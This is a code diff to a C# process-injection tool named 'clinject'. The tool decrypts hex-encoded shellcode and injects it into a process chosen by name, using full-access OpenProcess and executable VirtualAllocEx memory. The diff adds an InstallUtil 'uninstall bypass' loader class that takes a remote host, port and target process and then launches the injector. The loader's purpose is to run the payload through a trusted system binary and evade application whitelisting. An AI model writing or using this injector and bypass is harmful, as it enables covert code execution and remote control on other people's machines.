@@ -1,14 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.ComponentModel;
 using System.IO;
 using System.Security.Cryptography;
-using System.Globalization;
+using System.Configuration.Install;
 
 namespace clinject
 {
@@ -54,6 +49,8 @@ namespace clinject
             // Convert Decrypted sc back to bytes
             byte[] e = new byte[roundnodash.Length];
             for (int i = 0; i < roundnodash.Length; i++) e[i] = Convert.ToByte(roundnodash[i], 16);
+
+            // get handle to target and inject
             Process[] localByName = Process.GetProcessesByName(args[2]);
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
@@ -137,6 +134,33 @@ namespace clinject
             }
 
             return plaintext;
+        }
+    }
+    // InstallUtill uninstall bypass
+    [System.ComponentModel.RunInstaller(true)]
+    public class Loader : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            string rhost = this.Context.Parameters["rhost"];
+            if (rhost == null)
+            {
+                throw new InstallException("Mandatory parameter 'rhost'");
+            }
+
+            string port = this.Context.Parameters["rport"];
+            if (port == null)
+            {
+                throw new InstallException("Mandatory parameter 'port'");
+            }
+
+            string proc = this.Context.Parameters["process"];
+            if (proc == null)
+            {
+                throw new InstallException("Mandatory parameter 'process'");
+            }
+            string[] args = new string[] { rhost, port, proc};
+            clinject.Main(args);
         }
     }
 }
